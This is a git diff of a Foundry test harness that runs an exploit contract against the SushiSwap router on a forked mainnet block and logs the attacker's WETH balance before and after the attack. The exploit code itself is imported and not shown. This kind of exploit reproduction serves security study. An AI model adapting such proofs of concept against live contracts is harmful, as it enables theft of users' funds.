@@ -5,17 +5,17 @@ import "../SushiRouterExploit.sol";
 
 
 contract ContractTest is Test{
-    SushiExpProxy f;
+    Exploit exp;
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     function setUp() public {
-        vm.createSelectFork("https://rpc.flashbots.net", 17007841);
+        vm.createSelectFork("mainnet", 17007841);
     }
 
     function test_sushiRouter() public {
-        f = new SushiExpProxy();
-        address exp_addr = computeCreateAddress(address(f), 1);
+        exp = new Exploit();
+        address exp_addr = computeCreateAddress(address(exp), 1);
         console.log("WETH balance before attack: ", WETH.balanceOf(exp_addr));
-        f.exploit();
+        exp.exploit();
         console.log("WETH balance after attack:", WETH.balanceOf(address(exp_addr)));
     }
 }
